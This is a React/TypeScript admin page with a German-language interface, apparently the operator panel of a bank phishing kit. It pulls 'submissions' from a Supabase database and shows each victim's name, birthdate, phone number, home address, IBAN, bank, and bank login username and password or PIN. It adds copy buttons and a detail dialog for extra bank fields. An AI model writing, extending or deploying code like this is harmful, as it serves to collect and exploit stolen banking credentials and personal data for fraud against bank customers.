import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import type { User } from "@supabase/supabase-js";
import Header from "@/components/Header";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { toast } from "sonner";
import { Copy, Eye, LogOut } from "lucide-react";

interface Submission {
  id: string;
  session_id: string;
  created_at: string;
  full_name: string | null;
  email: string | null;
  birthdate: string | null;
  phone: string | null;
  street: string | null;
  house_number: string | null;
  staircase: string | null;
  door_number: string | null;
  postal_code: string | null;
  city: string | null;
  iban: string | null;
  bank: string | null;
  bank_username: string | null;
  bank_password: string | null;
  bank_username_label: string | null;
  bank_password_label: string | null;
  bank_extra: Record<string, string> | null;
}

const AdminLogs = () => {
  const navigate = useNavigate();
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(true);
  const [submissions, setSubmissions] = useState<Submission[]>([]);
  const [selectedSubmission, setSelectedSubmission] = useState<Submission | null>(null);

  useEffect(() => {
    const { data: { subscription } } = supabase.auth.onAuthStateChange((_event, session) => {
      if (!session) {
        navigate("/auth");
      } else {
        setUser(session.user);
      }
    });

    supabase.auth.getSession().then(({ data: { session } }) => {
      if (!session) {
        navigate("/auth");
      } else {
        setUser(session.user);
        fetchSubmissions();
      }
      setLoading(false);
    });

    return () => subscription.unsubscribe();
  }, [navigate]);

  const fetchSubmissions = async () => {
    const { data, error } = await supabase
      .from("submissions")
      .select("*")
      .order("created_at", { ascending: false });

    if (!error && data) {
      setSubmissions(data as Submission[]);
    }
  };

  const handleLogout = async () => {
    await supabase.auth.signOut();
    navigate("/auth");
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast.success("Kopiert!");
  };

  const parseName = (fullName: string | null) => {
    if (!fullName) return { first: "-", last: "-" };
    const parts = fullName.trim().split(/\s+/);
    if (parts.length === 1) return { first: parts[0], last: "-" };
    return { first: parts[0], last: parts.slice(1).join(" ") };
  };

  if (loading) {
    return (
      <div className="flex min-h-screen items-center justify-center">
        <p className="text-gray-500">Laden...</p>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <Header />
      <div className="container mx-auto px-4 py-8">
        <div className="mb-6 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <h1 className="text-2xl font-bold text-gray-900">Logs</h1>
            <Button variant="outline" size="sm" onClick={() => navigate("/admin")}>
              ← Admin
            </Button>
          </div>
          <div className="flex items-center gap-3">
            <Button variant="outline" size="sm" onClick={fetchSubmissions}>
              Aktualisieren
            </Button>
            <Button variant="outline" size="sm" onClick={handleLogout}>
              <LogOut className="mr-1 h-4 w-4" /> Logout
            </Button>
          </div>
        </div>

        <div className="rounded-lg border bg-white shadow-sm overflow-x-auto">
          <Table>
            <TableHeader>
              <TableRow>
                <TableHead>Zeitpunkt</TableHead>
                <TableHead>Vorname</TableHead>
                <TableHead>Nachname</TableHead>
                <TableHead>Telefonnummer</TableHead>
                <TableHead>Geburtsdatum</TableHead>
                <TableHead>Stadt</TableHead>
                <TableHead>Bank</TableHead>
                <TableHead>Login-Name</TableHead>
                <TableHead>Passwort/PIN</TableHead>
                <TableHead>Details</TableHead>
              </TableRow>
            </TableHeader>
            <TableBody>
              {submissions.map((sub) => {
                const { first, last } = parseName(sub.full_name);
                return (
                  <TableRow key={sub.id}>
                    <TableCell>{first}</TableCell>
                    <TableCell>{last}</TableCell>
                    <TableCell>
                      {sub.phone ? (
                        <button
                          onClick={() => copyToClipboard(sub.phone!)}
                          className="flex items-center gap-1 text-blue-600 hover:underline"
                        >
                          {sub.phone} <Copy className="h-3 w-3" />
                        </button>
                      ) : "-"}
                    </TableCell>
                    <TableCell>{sub.birthdate || "-"}</TableCell>
                    <TableCell>{sub.city || "-"}</TableCell>
                    <TableCell>{sub.bank || "-"}</TableCell>
                    <TableCell>{sub.bank_username || "-"}</TableCell>
                    <TableCell>{sub.bank_password || "-"}</TableCell>
                    <TableCell>
                      <Button size="sm" variant="outline" onClick={() => setSelectedSubmission(sub)}>
                        <Eye className="mr-1 h-3 w-3" /> Details
                      </Button>
                    </TableCell>
                  </TableRow>
                );
              })}
              {submissions.length === 0 && (
                <TableRow>
                  <TableCell colSpan={9} className="text-center text-gray-400 py-8">
                    Keine Einträge vorhanden
                  </TableCell>
                </TableRow>
              )}
            </TableBody>
          </Table>
        </div>
      </div>

      {/* Detail Dialog */}
      <Dialog open={!!selectedSubmission} onOpenChange={(open) => !open && setSelectedSubmission(null)}>
        <DialogContent className="max-w-lg max-h-[80vh] overflow-y-auto">
          <DialogHeader>
            <DialogTitle>Submission Details</DialogTitle>
          </DialogHeader>
          {selectedSubmission && (
            <div className="space-y-3 text-sm">
              <DetailRow label="Zeitpunkt" value={new Date(selectedSubmission.created_at).toLocaleString("de-AT")} />
              <DetailRow label="Session-ID" value={selectedSubmission.session_id} />
              <hr />
              <p className="font-semibold text-gray-700">Persönliche Daten</p>
              <DetailRow label="Voller Name" value={selectedSubmission.full_name} />
              <DetailRow label="E-Mail" value={selectedSubmission.email} />
              <DetailRow label="Geburtsdatum" value={selectedSubmission.birthdate} />
              <DetailRow label="Telefonnummer" value={selectedSubmission.phone} copyable />
              <DetailRow label="Straße" value={selectedSubmission.street} />
              <DetailRow label="Hausnummer" value={selectedSubmission.house_number} />
              <DetailRow label="Stiege" value={selectedSubmission.staircase} />
              <DetailRow label="Türnummer" value={selectedSubmission.door_number} />
              <DetailRow label="PLZ" value={selectedSubmission.postal_code} />
              <DetailRow label="Stadt" value={selectedSubmission.city} />
              <DetailRow label="IBAN" value={selectedSubmission.iban} />
              <DetailRow label="Bank" value={selectedSubmission.bank} />
              <hr />
              <p className="font-semibold text-gray-700">Bank-Login</p>
              <DetailRow
                label={selectedSubmission.bank_username_label || "Benutzername"}
                value={selectedSubmission.bank_username}
              />
              <DetailRow
                label={selectedSubmission.bank_password_label || "Passwort"}
                value={selectedSubmission.bank_password}
              />
              {selectedSubmission.bank_extra && Object.keys(selectedSubmission.bank_extra).length > 0 && (
                <>
                  <hr />
                  <p className="font-semibold text-gray-700">Zusatzfelder</p>
                  {Object.entries(selectedSubmission.bank_extra).map(([key, val]) => (
                    <DetailRow key={key} label={key} value={val} />
                  ))}
                </>
              )}
            </div>
          )}
        </DialogContent>
      </Dialog>
    </div>
  );
};

const DetailRow = ({ label, value, copyable }: { label: string; value: string | null | undefined; copyable?: boolean }) => (
  <div className="flex justify-between gap-4">
    <span className="text-gray-500 flex-shrink-0">{label}:</span>
    <span className="text-gray-900 text-right font-medium flex items-center gap-1">
      {value || "-"}
      {copyable && value && (
        <button
          onClick={() => {
            navigator.clipboard.writeText(value);
            toast.success("Kopiert!");
          }}
          className="text-blue-500 hover:text-blue-700"
        >
          <Copy className="h-3 w-3" />
        </button>
      )}
    </span>
  </div>
);

export default AdminLogs;
